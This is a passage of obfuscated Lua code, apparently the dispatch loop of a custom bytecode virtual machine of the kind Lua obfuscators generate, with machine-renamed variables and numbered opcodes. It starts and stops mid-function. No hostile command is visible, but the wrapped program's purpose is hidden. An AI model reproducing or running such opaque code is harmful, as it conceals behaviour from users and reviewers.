                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = {}
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_g = net_c[net_e]
                            for net_a = net_e + 1, net_a[3] do
                                net_i(net_g, net_c[net_a])
                            end
                        elseif net_e > 83 then
                            local net_e
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            do
                                return net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            end
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            do
                                return net_g(net_c, net_e, net_h)
                            end
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            do
                                return
                            end
                        else
                            local net_e
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                        end
                    elseif net_e <= 92 then
                        if net_e <= 88 then
                            if net_e <= 86 then
                                if net_e > 85 then
                                    local net_b = net_a[2]
                                    local net_e = {net_c[net_b](net_g(net_c, net_b + 1, net_h))}
                                    local net_d = 0
                                    for net_a = net_b, net_a[4] do
                                        net_d = net_d + 1
                                        net_c[net_a] = net_e[net_d]
                                    end
                                else
                                    net_c[net_a[2]] = net_a[3] / net_a[4]
                                end
                            elseif net_e > 87 then
                                net_c[net_a[2]] = net_a[3]
                            else
                                local net_d = net_a[2]
                                local net_b = net_c[net_a[3]]
                                net_c[net_d + 1] = net_b
                                net_c[net_d] = net_b[net_a[4]]
                            end
                        elseif net_e <= 90 then
                            if net_e > 89 then
                                local net_e
                                net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                            else
                                net_c[net_a[2]] = net_c[net_a[3]]
                            end
                        elseif net_e == 91 then
                            net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                        else
                            net_b = net_a[3]
                        end
                    elseif net_e <= 96 then
                        if net_e <= 94 then
                            if net_e == 93 then
                                local net_e
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                if (net_c[net_a[2]] ~= net_a[4]) then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            else
                                if (net_c[net_a[2]] ~= net_a[4]) then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            end
                        elseif net_e == 95 then
                            local net_e
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e]()
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e]()
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            do
                                return
                            end
                        else
                            local net_e
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                        end
                    elseif net_e <= 98 then
                        if net_e > 97 then
                            local net_a = net_a[2]
                            local net_b = net_c[net_a]
                            for net_a = net_a + 1, net_h do
                                net_i(net_b, net_c[net_a])
                            end
                        else
                            local net_a = net_a[2]
                            local net_d, net_b = net_n(net_c[net_a](net_c[net_a + 1]))
                            net_h = net_b + net_a - 1
                            local net_b = 0
                            for net_a = net_a, net_h do
                                net_b = net_b + 1
                                net_c[net_a] = net_d[net_b]
                            end
                        end
                    elseif net_e <= 99 then
                        local net_b = net_a[2]
                        net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                    elseif net_e == 100 then
                        local net_g
                        local net_e
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = {}
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_g = net_c[net_e]
                        for net_a = net_e + 1, net_a[3] do
                            net_i(net_g, net_c[net_a])
                        end
                    else
                        local net_e
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                    end
                elseif net_e <= 118 then
                    if net_e <= 109 then
                        if net_e <= 105 then
                            if net_e <= 103 then
                                if net_e == 102 then
                                    local net_a = net_a[2]
                                    net_c[net_a] = net_c[net_a](net_c[net_a + 1])
                                else
                                    local net_j
                                    local net_g
                                    local net_e
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e] = net_c[net_e]()
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = {}
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_h = net_e + net_o - 1
                                    for net_a = net_e, net_h do
                                        net_g = net_l[net_a - net_e]
                                        net_c[net_a] = net_g
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_j = net_c[net_e]
                                    for net_a = net_e + 1, net_h do
                                        net_i(net_j, net_c[net_a])
                                    end
                                end
                            elseif net_e > 104 then
                                net_c[net_a[2]] = net_a[3] / net_a[4]
                            else
                                net_c[net_a[2]][net_a[3]] = net_a[4]
                            end
                        elseif net_e <= 107 then
                            if net_e > 106 then
                                local net_h
                                local net_e
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e]()
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]][net_a[3]] = net_a[4]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = net_c[net_a[3]]
                                net_c[net_e + 1] = net_h
                                net_c[net_e] = net_h[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]]()
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_b = net_a[3]
                            else
                                local net_g
                                local net_e
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = {}
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_g = net_c[net_e]
                                for net_a = net_e + 1, net_a[3] do
                                    net_i(net_g, net_c[net_a])
                                end
                            end
                        elseif net_e > 108 then
                            net_c[net_a[2]] = {}
                        else
                            do
                                return net_c[net_a[2]]
                            end
                        end
                    elseif net_e <= 113 then
                        if net_e <= 111 then
                            if net_e > 110 then
                                local net_a = net_a[2]
                                net_c[net_a](net_c[net_a + 1])
                            else
                                local net_e
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                            end
                        elseif net_e == 112 then
                            net_c[net_a[2]] = (net_a[3] ~= 0)
                        else
                            local net_a = net_a[2]
                            do
                                return net_c[net_a](net_g(net_c, net_a + 1, net_h))
                            end
                        end
                    elseif net_e <= 115 then
                        if net_e == 114 then
                            local net_e
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e]()
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            do
                                return
                            end
                        else
                            local net_g
                            local net_i
                            local net_h
                            local net_e
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_h = net_c[net_a[3]]
                            net_c[net_e + 1] = net_h
                            net_c[net_e] = net_h[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_i = {net_c[net_e](net_c[net_e + 1])}
                            net_g = 0
                            for net_a = net_e, net_a[4] do
                                net_g = net_g + 1
                                net_c[net_a] = net_i[net_g]
                            end
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_b = net_a[3]
                        end
                    elseif net_e <= 116 then
                        net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                    elseif net_e > 117 then
                        local net_a = net_a[2]
                        net_h = net_a + net_o - 1
                        for net_b = net_a, net_h do
                            local net_a = net_l[net_b - net_a]
                            net_c[net_b] = net_a
                        end
                    else
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    end
                elseif net_e <= 127 then
                    if net_e <= 122 then
                        if net_e <= 120 then
                            if net_e > 119 then
                                net_c[net_a[2]] = net_c[net_a[3]] / net_c[net_a[4]]
                            else
                                if (net_c[net_a[2]] <= net_c[net_a[4]]) then
                                    net_b = net_a[3]
                                else
                                    net_b = net_b + 1
                                end
                            end
                        elseif net_e == 121 then
                            local net_h
                            local net_e
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e]()
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_h = net_c[net_a[3]]
                            net_c[net_e + 1] = net_h
                            net_c[net_e] = net_h[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3] / net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3] / net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3] / net_a[4]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_h = net_c[net_a[3]]
                            net_c[net_e + 1] = net_h
                            net_c[net_e] = net_h[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_a[3]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_h = net_c[net_a[3]]
                            net_c[net_e + 1] = net_h
                            net_c[net_e] = net_h[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_b = net_a[3]
                        else
                            local net_e
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                        end
                    elseif net_e <= 124 then
                        if net_e > 123 then
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        else
                            net_c[net_a[2]] = net_c[net_a[3]] + net_c[net_a[4]]
                        end
                    elseif net_e <= 125 then
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        do
                            return
                        end
                    elseif net_e == 126 then
                        net_c[net_a[2]] = net_m(net_p[net_a[3]], nil, net_f)
                    else
                        if net_c[net_a[2]] then
                            net_b = net_b + 1
                        else
                            net_b = net_a[3]
                        end
                    end
                elseif net_e <= 131 then
                    if net_e <= 129 then
                        if net_e > 128 then
                            local net_e
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            if net_c[net_a[2]] then
                                net_b = net_b + 1
                            else
                                net_b = net_a[3]
                            end
                        else
                            local net_d = net_a[2]
                            local net_e = {net_c[net_d](net_g(net_c, net_d + 1, net_h))}
                            local net_b = 0
                            for net_a = net_d, net_a[4] do
                                net_b = net_b + 1
                                net_c[net_a] = net_e[net_b]
                            end
                        end
                    elseif net_e == 130 then
                        local net_d = net_a[2]
                        local net_e = net_c[net_d]
                        local net_f = net_c[net_d + 2]
                        if (net_f > 0) then
                            if (net_e > net_c[net_d + 1]) then
                                net_b = net_a[3]
                            else
                                net_c[net_d + 3] = net_e
                            end
                        elseif (net_e < net_c[net_d + 1]) then
                            net_b = net_a[3]
                        else
                            net_c[net_d + 3] = net_e
                        end
                    else
                        local net_a = net_a[2]
                        net_c[net_a] = net_c[net_a]()
                    end
                elseif net_e <= 133 then
                    if net_e == 132 then
                        net_f[net_a[3]] = net_c[net_a[2]]
                    else
                        local net_d = net_a[2]
                        local net_f = net_a[4]
                        local net_e = net_d + 2
                        local net_d = {net_c[net_d](net_c[net_d + 1], net_c[net_e])}
                        for net_a = 1, net_f do
